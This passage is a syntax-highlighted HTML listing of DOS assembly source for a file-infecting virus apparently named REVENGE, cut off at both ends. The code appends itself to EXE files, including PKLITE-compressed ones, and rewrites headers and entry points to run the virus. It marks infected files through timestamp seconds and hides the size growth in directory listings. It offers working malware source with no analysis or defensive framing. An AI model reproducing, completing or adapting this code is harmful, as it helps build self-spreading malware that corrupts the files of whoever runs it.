                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">activation</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">popregs_iret</span><span class="sc0">

</span><span class="sc5">activation</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; DS:=CS-10h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">print_REVENGE</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">popregs_iret</span><span class="sc0">

</span><span class="sc5">is_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">host_type</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; EXE file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check4pklite_exe</span><span class="sc0">        </span><span class="sc1">; Pklited file?</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">no_pk_exe</span><span class="sc0">               </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">pk_exe</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'I''M GOING SLIGHTLY MAD'</span><span class="sc0">

</span><span class="sc5">pk_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pklite_exe</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; It's a pklited exe</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">process_exe</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

</span><span class="sc5">no_pk_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pklite_exe</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; It isn't a pklited exe</span><span class="sc0">
</span><span class="sc5">process_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">_hdrsize</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; *16 (Header size in bytes)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseekDX_functionAX</span><span class="sc0">      </span><span class="sc1">; Read a byte</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">encrypted_byte</span><span class="sc4">,</span><span class="sc2">7Eh</span><span class="sc0">      </span><span class="sc1">; Encrypt it</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseekDX_functionAX</span><span class="sc0">      </span><span class="sc1">; Write byte</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">store_header</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Don''t lose your header'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">store_header</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">header</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">header_exe</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">e_header_exe</span><span class="sc4">-</span><span class="sc5">header_exe</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">; Store header</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Lseek end</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">check_size_exe</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc5">check_size_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; &gt; 64k?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">check_big_exe</span><span class="sc0">   </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4000</span><span class="sc0">         </span><span class="sc1">; &gt;= 4000 bytes?</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">check_big_exe</span><span class="sc0">   </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">      </span><span class="sc1">; No? then jmp (too small)</span><span class="sc0">

</span><span class="sc5">check_big_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">            </span><span class="sc1">; &gt; 9*64k ?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">fix_header</span><span class="sc0">      </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">      </span><span class="sc1">; Yes? then jmp (too big)</span><span class="sc0">

</span><span class="sc5">fix_header</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">size_exe_l</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Store file size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">size_exe_h</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0"> 
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; Calculate number of pages</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pagecnt</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">pagecnt</span><span class="sc0">         </span><span class="sc1">; Not always!!!</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">partpag</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; Length of partial page at end</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">size_exe_l</span><span class="sc0">   </span><span class="sc1">; Get original size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">size_exe_h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; Calculate virus segment and IP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">exeip</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">        </span><span class="sc1">; Virus IP</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">hdrsize</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">relocs</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Virus segment</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">reloss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Stack segment</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">exesp</span><span class="sc4">,</span><span class="sc2">0FFFEh</span><span class="sc0">    </span><span class="sc1">; SP</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">exeip</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ofs_vircode</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; Virus runtime offset</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Lseek start</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">patch_pk_header?</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc5">patch_pk_header?</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">pklite_exe</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Pklited exe?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">write_header_exe</span><span class="sc0">        </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">exeip</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pk_exe_ip</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">relocs</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">          </span><span class="sc1">; Add PSP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pk_exe_cs</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">_exeip</span><span class="sc0">       </span><span class="sc1">; Header points to Pklite code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">exeip</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">_relocs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">relocs</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">write_header_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">header_exe</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">e_header_exe</span><span class="sc4">-</span><span class="sc5">header_exe</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Write new header</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">wrote_header_exe</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc5">wrote_header_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">pklite_exe</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; Pklited exe?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">patch_pkexe</span><span class="sc0">     </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">append_code</span><span class="sc0">

</span><span class="sc5">patch_pkexe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">ofs_segcode</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">29h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; Lseek to code segment+29h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">e_pkexe_patch</span><span class="sc4">-</span><span class="sc5">pkexe_patch</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">pkexe_patch</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Write patch</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">patch2_pkexe</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc5">patch2_pkexe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">ofs_segcode</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Lseek to code segment+0Dh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">jmp_xx_pkexe</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Write jmp (force jmp to patched code)</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">jmp2_append_code</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc5">jmp2_append_code</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">append_code</span><span class="sc0">

</span><span class="sc5">jmp_xx_pkexe</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EBh</span><span class="sc0">            </span><span class="sc1">; jmp xx</span><span class="sc0">

</span><span class="sc5">pkexe_patch</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">135h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">            </span><span class="sc1">; jmp far to virus start</span><span class="sc0">
</span><span class="sc5">pk_exe_ip</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pk_exe_cs</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">e_pkexe_patch</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">size_exe_l</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">size_exe_h</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">pklite_exe</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; 0 = Exe-file not compressed with Pklite</span><span class="sc0">
                                </span><span class="sc1">; 1 = Exe-file compressed with Pklite</span><span class="sc0">

</span><span class="sc5">header_exe</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">signature</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">partpag</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pagecnt</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">relocnt</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">hdrsize</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">minmem</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maxmem</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">reloss</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">exesp</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">chksum</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">exeip</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">relocs</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">tabloff</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">overlay</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">e_header_exe</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Just very slightly mad !'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ff_fn</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">found_fffn</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_fffn_preserve_AX</span><span class="sc0">

</span><span class="sc5">found_fffn</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Get DTA address in ES:BX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get attributes</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">          </span><span class="sc1">; Subdirectory?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_directory</span><span class="sc0">    </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_fffn</span><span class="sc0">

</span><span class="sc5">no_directory</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get file time</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get file date</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; AX:=file date</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">          </span><span class="sc1">; AX:=month</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; AX:=file time</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">          </span><span class="sc1">; AX:=seconds</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; seconds=month? Infected?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">check_table_ext</span><span class="sc0"> </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; &gt;64KB?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">restore_size</span><span class="sc0">            </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">  </span><span class="sc1">; &gt;=virus size</span><span class="sc0">
